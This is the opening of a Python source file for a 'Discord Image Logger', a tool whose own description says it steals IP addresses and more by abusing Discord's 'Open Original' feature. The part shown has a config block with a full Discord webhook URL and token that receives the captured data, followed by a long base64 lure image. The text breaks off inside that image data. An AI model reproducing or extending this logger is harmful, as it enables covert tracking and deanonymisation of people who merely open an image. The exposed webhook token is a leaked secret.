# discord.gg/wingsminer
# Thanks for help DLB, finkyy
# Don't change any settings. This can be this may prevent the code from working.
#
# █     █░█ ██▄    █   ▄████   ██████  ███▄ ▄███▓ ██▓ ███▄    █ ▓█████  ██▀███  
#▓█░ █ ░█░█ █ ▀█   █  ██▒ ▀█▒▒██    ▒ ▓██▒▀█▀ ██▒▓██▒ ██ ▀█   █ ▓█   ▀ ▓██ ▒ ██▒
#▒█░ █ ░█▓█ █  ▀█ ██▒▒██░▄▄▄░░ ▓██▄   ▓██    ▓██░▒██▒▓██  ▀█ ██▒▒███   ▓██ ░▄█ ▒
#░█░ █ ░█▓█ █▒  ▐▌██▒░▓█  ██▓  ▒   ██▒▒██    ▒██ ░██░▓██▒  ▐▌██▒▒▓█  ▄ ▒██▀▀█▄  
#░░██▒██▓▒█ █░   ▓██░░▒▓███▀▒▒██████▒▒▒██▒   ░██▒░██░▒██░   ▓██░░▒████▒░██▓ ▒██▒
#░ ▓░▒ ▒ ░ ▒░   ▒ ▒  ░▒   ▒ ▒ ▒▓▒ ▒ ░░ ▒░   ░  ░░▓  ░ ▒░   ▒ ▒ ░░ ▒░ ░░ ▒▓ ░▒▓░
#  ▒ ░ ░ ░ ░░   ░ ▒░  ░   ░ ░ ░▒  ░ ░░  ░      ░ ▒ ░░ ░░   ░ ▒░ ░ ░  ░  ░▒ ░ ▒░
#  ░   ░    ░   ░ ░ ░ ░   ░ ░  ░  ░  ░      ░    ▒ ░   ░   ░ ░    ░     ░░   ░ 
#    ░            ░       ░       ░         ░    ░           ░    ░  ░   ░     

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "lynxWings"

config = {
    "webhook": "https://discord.com/api/webhooks/1130883445216792606/I6L31fPaX2ELfMSdPy35UsDfzdT3i_RjvEDnSeBstJCX_rGJc_FW3oaKaLCROi2IqsZ8", # <------------------------- Put your webhook link here.
    "image": "data:image/jpeg;base64,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